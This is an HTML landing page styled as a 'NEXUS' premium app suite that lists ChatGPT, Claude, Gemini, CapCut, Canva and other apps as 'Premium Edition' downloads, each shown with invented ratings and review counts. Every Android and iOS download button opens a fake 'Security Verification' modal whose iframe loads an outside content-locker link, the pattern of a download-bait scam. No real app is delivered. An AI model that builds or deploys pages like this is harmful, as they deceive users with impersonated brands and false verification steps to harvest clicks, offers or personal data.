<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NextGen App Suite | Premium Discovery</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        :root {
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
            --accent: #6366f1;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #050505;
            color: white;
            overflow-x: hidden;
            margin: 0;
        }

        /* 4D Background Effect */
        .bg-glow {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 50% -20%, #1e1b4b 0%, #050505 80%);
            z-index: -1;
        }

        .orb {
            position: fixed;
            width: 400px; height: 400px;
            background: var(--accent);
            filter: blur(120px);
            border-radius: 50%;
            opacity: 0.15;
            animation: float 20s infinite alternate;
            z-index: -1;
        }

        @keyframes float {
            0% { transform: translate(-10%, -10%); }
            100% { transform: translate(20%, 30%); }
        }

        .glass-card {
            background: var(--glass);
            backdrop-filter: blur(12px);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: pointer;
        }

        .glass-card:hover {
            transform: translateY(-10px) scale(1.02);
            background: rgba(255, 255, 255, 0.07);
            border-color: var(--accent);
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        }

        .modal-active {
            overflow: hidden;
        }

        #detail-view, #locker-modal {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 50;
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(20px);
            overflow-y: auto;
        }

        .animate-in {
            animation: slideUp 0.5s ease forwards;
        }

        @keyframes slideUp {
            from { transform: translateY(100px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .btn-gradient {
            background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
            transition: transform 0.2s;
        }

        .btn-gradient:active { transform: scale(0.95); }

        iframe {
            width: 100%;
            height: 80vh;
            border-radius: 20px;
            border: 1px solid var(--glass-border);
        }
    </style>
</head>
<body>

    <div class="bg-glow"></div>
    <div class="orb"></div>

    <nav class="p-6 flex justify-between items-center max-w-6xl mx-auto">
        <div class="text-2xl font-black tracking-tighter italic">NEXUS<span class="text-indigo-500">.</span></div>
        <div class="glass-card px-4 py-2 text-xs font-bold uppercase tracking-widest border-none">Premium Access</div>
    </nav>

    <main class="max-w-6xl mx-auto px-6 py-12">
        <header class="mb-12 text-center">
            <h1 class="text-4xl md:text-6xl font-extrabold mb-4 bg-clip-text text-transparent bg-gradient-to-b from-white to-gray-500">
                The Future of Intelligence
            </h1>
            <p class="text-gray-400 max-w-xl mx-auto">Experience the world's most powerful AI and creative tools in one immersive workspace.</p>
        </header>

        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6" id="app-grid">
            </div>
    </main>

    <div id="detail-view" class="p-4 md:p-12">
        <div class="max-w-4xl mx-auto bg-[#0a0a0a] rounded-[40px] border border-white/10 overflow-hidden relative animate-in">
            <button onclick="closeDetail()" class="absolute top-6 right-6 text-gray-400 hover:text-white">
                <i data-lucide="x-circle"></i>
            </button>
            
            <div class="p-8 md:p-12">
                <div class="flex flex-col md:flex-row gap-8 items-center md:items-start">
                    <img id="detail-logo" src="" class="w-32 h-32 rounded-3xl shadow-2xl" alt="App Logo">
                    <div class="text-center md:text-left">
                        <h2 id="detail-name" class="text-4xl font-bold mb-2"></h2>
                        <div class="flex items-center justify-center md:justify-start gap-2 text-yellow-500 mb-4">
                            <i data-lucide="star" class="fill-current w-4"></i>
                            <span id="detail-rating" class="text-white font-bold">4.9</span>
                            <span class="text-gray-500 text-sm">(124k Reviews)</span>
                        </div>
                        <p id="detail-desc" class="text-gray-400 leading-relaxed mb-8"></p>
                    </div>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-8" id="detail-features"></div>

                <div class="flex flex-col md:flex-row gap-4 mt-12">
                    <button onclick="openLocker()" class="flex-1 btn-gradient py-5 rounded-2xl font-bold flex items-center justify-center gap-3">
                        <i data-lucide="play"></i> Get for Android
                    </button>
                    <button onclick="openLocker()" class="flex-1 bg-white text-black py-5 rounded-2xl font-bold flex items-center justify-center gap-3 hover:bg-gray-200 transition">
                        <i data-lucide="apple"></i> Get for iOS
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div id="locker-modal" class="flex items-center justify-center p-4">
        <div class="w-full max-w-2xl bg-black rounded-3xl border border-indigo-500/30 overflow-hidden relative shadow-[0_0_50px_rgba(99,102,241,0.2)]">
            <div class="p-4 border-b border-white/10 flex justify-between items-center bg-gray-900/50">
                <span class="text-sm font-bold tracking-widest uppercase">Security Verification</span>
                <button onclick="closeLocker()" class="text-gray-400"><i data-lucide="x"></i></button>
            </div>
            <iframe src="https://appchecker.space/cl/i/6nnlj7" frameborder="0"></iframe>
        </div>
    </div>

    <script>
        const apps = [
            {
                name: "ChatGPT",
                logo: "https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg",
                desc: "The world's leading AI assistant. Write, learn, and brainstorm instantly.",
                features: ["Real-time reasoning", "Voice Mode", "DALL-E 3 Image Gen"],
                rating: "4.9"
            },
            {
                name: "Claude",
                logo: "https://upload.wikimedia.org/wikipedia/commons/d/d4/Claude_AI_logo.svg",
                desc: "Next-generation AI assistant by Anthropic. Highly ethical and deeply analytical.",
                features: ["Large context window", "Coding expert", "Natural writing"],
                rating: "4.8"
            },
            {
                name: "Gemini",
                logo: "https://upload.wikimedia.org/wikipedia/commons/8/8a/Google_Gemini_logo.svg",
                desc: "Google's most capable AI model. Integrated with your favorite Google apps.",
                features: ["Multimodal search", "Google Workspace sync", "Ultra-fast"],
                rating: "4.7"
            },
            {
                name: "Perplexity",
                logo: "https://upload.wikimedia.org/wikipedia/commons/f/f0/Perplexity_AI_logo.svg",
                desc: "A revolutionary search engine that provides direct answers with cited sources.",
                features: ["Source tracking", "Pro Search mode", "Live web access"],
                rating: "4.9"
            },
            {
                name: "CapCut",
                logo: "https://upload.wikimedia.org/wikipedia/commons/0/0e/CapCut_logo.svg",
                desc: "The ultimate video editor. Professional effects and AI-driven editing made simple.",
                features: ["Auto captions", "Background removal", "4K Export"],
                rating: "4.8"
            },
            {
                name: "Canva",
                logo: "https://upload.wikimedia.org/wikipedia/commons/0/08/Canva_icon_2021.svg",
                desc: "Design anything in seconds. From social posts to professional presentations.",
                features: ["Magic Studio AI", "Millions of templates", "Team collab"],
                rating: "4.9"
            },
            {
                name: "DeepSeek",
                logo: "https://asset.brandfetch.io/id_X8X5xX_/id_Z7X5xX_.png", // Placeholder/Reliable CDN
                desc: "Advanced open-source AI models pushing the boundaries of code and math.",
                features: ["DeepSeek-V3", "Advanced Coder", "Math specialized"],
                rating: "4.8"
            }
        ];

        function initGrid() {
            const grid = document.getElementById('app-grid');
            apps.forEach(app => {
                const card = document.createElement('div');
                card.className = 'glass-card p-6 flex flex-col items-center text-center';
                card.onclick = () => showDetail(app);
                card.innerHTML = `
                    <img src="${app.logo}" class="w-20 h-20 rounded-2xl mb-4 shadow-lg bg-white/5 p-2" alt="${app.name}">
                    <h3 class="font-bold text-lg">${app.name}</h3>
                    <p class="text-xs text-gray-500 mt-1 italic">Premium Edition</p>
                `;
                grid.appendChild(card);
            });
            lucide.createIcons();
        }

        function showDetail(app) {
            document.getElementById('detail-name').innerText = app.name;
            document.getElementById('detail-logo').src = app.logo;
            document.getElementById('detail-desc').innerText = app.desc;
            document.getElementById('detail-rating').innerText = app.rating;
            
            const featContainer = document.getElementById('detail-features');
            featContainer.innerHTML = app.features.map(f => `
                <div class="flex items-center gap-3 bg-white/5 p-4 rounded-xl border border-white/5">
                    <i data-lucide="check-circle" class="text-indigo-400 w-5"></i>
                    <span class="text-sm text-gray-300">${f}</span>
                </div>
            `).join('');
            
            document.getElementById('detail-view').style.display = 'block';
            document.body.classList.add('modal-active');
            lucide.createIcons();
        }

        function closeDetail() {
            document.getElementById('detail-view').style.display = 'none';
            document.body.classList.remove('modal-active');
        }

        function openLocker() {
            document.getElementById('locker-modal').style.display = 'flex';
        }

        function closeLocker() {
            document.getElementById('locker-modal').style.display = 'none';
        }

        window.onclick = function(event) {
            if (event.target.id === 'detail-view') closeDetail();
            if (event.target.id === 'locker-modal') closeLocker();
        }

        initGrid();
    </script>
</body>
</html>
